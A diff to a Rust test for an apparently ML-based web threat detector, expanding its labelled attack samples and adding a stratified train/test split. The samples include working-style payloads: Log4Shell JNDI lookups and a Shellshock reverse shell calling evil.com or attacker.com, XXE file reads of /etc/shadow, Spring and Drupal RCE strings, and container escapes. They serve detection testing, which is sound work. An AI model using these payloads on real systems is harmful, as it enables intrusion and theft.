@@ -211,18 +211,58 @@ fn generate_threat_samples() -> Vec<TestSample> {
         ("POST /fetch url=file:///etc/passwd HTTP/1.1", "File protocol SSRF"),
     ];
     
-    // Software Exploit patterns (web service specific)
+    // Software Exploit patterns (web service specific) - EXPANDED for better generalization
     let web_exploits = vec![
+        // Java/Deserialization attacks
         ("POST /api/deserialize data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA HTTP/1.1", "Java deserialization"),
+        ("POST /invoke data=aced0005737200176a617661HTTP/1.1", "Java serialized object"),
+        ("POST /api/object Content-Type: application/x-java-serialized-object HTTP/1.1", "Java object injection"),
+        
+        // Framework-specific exploits
         ("GET /struts2-showcase/${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)} HTTP/1.1", "Struts2 OGNL injection"),
+        ("POST /struts2/rest ${#context['xwork.MethodAccessor.denyMethodExecution']=false} HTTP/1.1", "Struts2 REST OGNL"),
+        ("GET /spring/cloud/function/routing?cmd=whoami HTTP/1.1", "Spring Cloud Function RCE"),
+        ("POST /actuator/gateway/routes {\"predicates\":[{\"args\":{\"_genkey_0\":\"#{T(java.lang.Runtime).getRuntime().exec('id')}\"}}]} HTTP/1.1", "Spring Gateway RCE"),
+        
+        // XXE attacks
         ("POST /xmlrpc.php <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><methodCall><methodName>&xxe;</methodName></methodCall> HTTP/1.1", "XXE injection"),
+        ("POST /soap <!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://evil.com/steal\">]><root>&xxe;</root> HTTP/1.1", "XXE SSRF"),
+        ("POST /api/xml <?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/shadow\">]><data>&file;</data> HTTP/1.1", "XXE file read"),
+        
+        // CMS exploits
         ("GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1", "WordPress RevSlider LFI"),
+        ("POST /wp-json/wp/v2/users {\"username\":\"hacker\",\"email\":\"h@h.com\",\"password\":\"hacked\",\"roles\":[\"administrator\"]} HTTP/1.1", "WordPress user creation"),
+        ("GET /drupal/user/password?name[#post_render][]=passthru&name[#markup]=id HTTP/1.1", "Drupalgeddon RCE"),
+        
+        // Shell/System exploits
         ("POST /cgi-bin/test.cgi HTTP/1.1 () { :;}; /bin/cat /etc/passwd", "Shellshock"),
-        ("GET /manager/html HTTP/1.1 Authorization: Basic YWRtaW46YWRtaW4=", "Tomcat default creds"),
+        ("POST /cgi-bin/bash HTTP/1.1 () { :;};echo;/bin/bash -i >& /dev/tcp/evil.com/4444 0>&1", "Shellshock reverse shell"),
+        
+        // Container/Orchestration exploits  
         ("POST /api/v1/pods?fieldManager=kubectl-client-side-apply {\"spec\":{\"containers\":[{\"image\":\"evil\",\"command\":[\"/bin/sh\"]}]}} HTTP/1.1", "K8s privilege escalation"),
+        ("GET /api/v1/namespaces/kube-system/secrets HTTP/1.1", "K8s secrets exfil"),
+        ("POST /containers/create {\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/host\"]} HTTP/1.1", "Docker container escape"),
+        
+        // Log4j/JNDI attacks
         ("GET /solr/admin/cores?action=CREATE&wt=json&name=${jndi:ldap://evil.com/a} HTTP/1.1", "Log4Shell"),
+        ("POST /api/login username=${jndi:ldap://attacker.com/exploit} HTTP/1.1", "Log4j JNDI injection"),
+        ("GET /search?q=${jndi:rmi://evil.com:1099/exploit} HTTP/1.1", "Log4j RMI injection"),
+        
+        // API/GraphQL exploits
         ("POST /api/graphql {\"query\":\"mutation{__typename @include(if: $foo)}\"} HTTP/1.1", "GraphQL DoS"),
+        ("POST /graphql {\"query\":\"{__schema{types{name,fields{name}}}}\",\"variables\":null} HTTP/1.1", "GraphQL introspection"),
+        
+        // Config/Secret exposure
         ("GET /.git/config HTTP/1.1", "Git config exposure"),
+        ("GET /.env HTTP/1.1", "Environment file exposure"),
+        ("GET /config/database.yml HTTP/1.1", "Database config exposure"),
+        ("GET /.aws/credentials HTTP/1.1", "AWS credentials exposure"),
+        ("GET /server-status HTTP/1.1", "Apache status exposure"),
+        
+        // Authentication bypass
+        ("GET /manager/html HTTP/1.1 Authorization: Basic YWRtaW46YWRtaW4=", "Tomcat default creds"),
+        ("GET /jenkins/script HTTP/1.1", "Jenkins script console"),
+        ("POST /api/authenticate {\"username\":\"admin\",\"password\":{\"$ne\":\"\"}} HTTP/1.1", "NoSQL auth bypass"),
     ];
     
     // LDAP Injection samples
@@ -505,33 +545,49 @@ fn test_comprehensive_experiential_learning() {
     // - Each pass: train on train set, evaluate on HELD-OUT test set
     // - Improvement on test set proves GENERALIZATION, not memorization
     
-    let num_passes = 15;
+    let num_passes = 25;  // Increased from 15 for better convergence
     
-    // Split threats into TRAIN (70%) and TEST (30%) - tests on UNSEEN threats
-    let threat_split = (threat_samples.len() * 7) / 10;
-    let train_threats: Vec<TestSample> = threat_samples.iter().take(threat_split).cloned().collect();
-    let test_threats: Vec<TestSample> = threat_samples.iter().skip(threat_split).cloned().collect();
+    // STRATIFIED SPLIT: Ensure each attack type is represented in both train and test
+    // Take 80% of EACH attack type for training, 20% for testing
+    let mut train_threats: Vec<TestSample> = Vec::new();
+    let mut test_threats: Vec<TestSample> = Vec::new();
     
-    // Split benign similarly
-    let benign_for_test: Vec<TestSample> = benign_training_samples.iter().skip(400).take(100).cloned().collect();
-    let benign_for_train: Vec<TestSample> = benign_training_samples.iter().take(200).cloned().collect();
+    // Group threats by attack type for stratified split
+    let mut threats_by_type: std::collections::HashMap<String, Vec<TestSample>> = std::collections::HashMap::new();
+    for sample in &threat_samples {
+        let attack_type = sample.attack_type.clone().unwrap_or("Unknown".to_string());
+        threats_by_type.entry(attack_type).or_insert_with(Vec::new).push(sample.clone());
+    }
     
-    // Training set: 200 benign + 70% of threats
+    // Stratified split: 80% train, 20% test from each attack type
+    for (attack_type, samples) in &threats_by_type {
+        let split_idx = (samples.len() * 8) / 10;  // 80% for training
+        let split_idx = split_idx.max(1);  // At least 1 for training
+        train_threats.extend(samples.iter().take(split_idx).cloned());
+        test_threats.extend(samples.iter().skip(split_idx).cloned());
+        println!("   {} split: {} train / {} test", attack_type, split_idx, samples.len() - split_idx);
+    }
+    
+    // Benign split
+    let benign_for_train: Vec<TestSample> = benign_training_samples.iter().take(300).cloned().collect();
+    let benign_for_test: Vec<TestSample> = benign_training_samples.iter().skip(300).take(100).cloned().collect();
+    
+    // Training set: 300 benign + 80% of each attack type
     let mut train_samples: Vec<TestSample> = Vec::new();
     train_samples.extend(benign_for_train.clone());
     train_samples.extend(train_threats.clone());
     
-    // Test set: 100 DIFFERENT benign + 30% UNSEEN threats
+    // Test set: 100 benign + 20% of each attack type (UNSEEN samples)
     let mut test_samples: Vec<TestSample> = Vec::new();
     test_samples.extend(benign_for_test.clone());
     test_samples.extend(test_threats.clone());
     
-    println!("📊 Dataset Split for Generalization Test:");
+    println!("\n📊 Stratified Dataset Split for Generalization Test:");
     println!("   Training: {} benign + {} threats = {} samples", 
              benign_for_train.len(), train_threats.len(), train_samples.len());
     println!("   Testing:  {} benign + {} UNSEEN threats = {} samples",
              benign_for_test.len(), test_threats.len(), test_samples.len());
-    println!("   (Test set contains threats NEVER seen during training)\n");
+    println!("   (Each attack type represented proportionally in both sets)\n");
     
     let mut previous_f1: f32 = 0.0;
     
@@ -626,8 +682,9 @@ fn test_comprehensive_experiential_learning() {
     println!("│ FINAL ATTACK TYPE DETECTION (After Adaptive Learning)                     │");
     println!("└────────────────────────────────────────────────────────────────────────────┘");
     
-    // Re-evaluate attack detection on ALL threat samples
+    // Re-evaluate attack detection on ALL threat samples with diagnostic logging
     let mut final_attack_metrics: std::collections::HashMap<String, (usize, usize, usize)> = std::collections::HashMap::new();
+    let mut missed_samples: Vec<(String, String, f32)> = Vec::new();  // (attack_type, description, score)
     
     for sample in &threat_samples {
         let attack_type = sample.attack_type.clone().unwrap_or("Unknown".to_string());
@@ -646,7 +703,21 @@ fn test_comprehensive_experiential_learning() {
             entry.1 += 1; // detected
         } else {
             entry.2 += 1; // missed
+            // Log missed samples for diagnosis
+            missed_samples.push((attack_type.clone(), sample.description.clone(), result.threat_score));
         }
+    }
+    
+    // Report missed samples if any
+    if !missed_samples.is_empty() {
+        println!("\n  ⚠️  MISSED THREAT SAMPLES ({} total):", missed_samples.len());
+        println!("  ─────────────────────────────────────────────────────────");
+        for (attack_type, description, score) in &missed_samples {
+            println!("  │ {} │ Score: {:.3} │", description, score);
+        }
+        println!("  ─────────────────────────────────────────────────────────\n");
+    } else {
+        println!("\n  ✅ ALL THREAT SAMPLES DETECTED!\n");
     }
     
     // Update threat_samples_by_type with final results
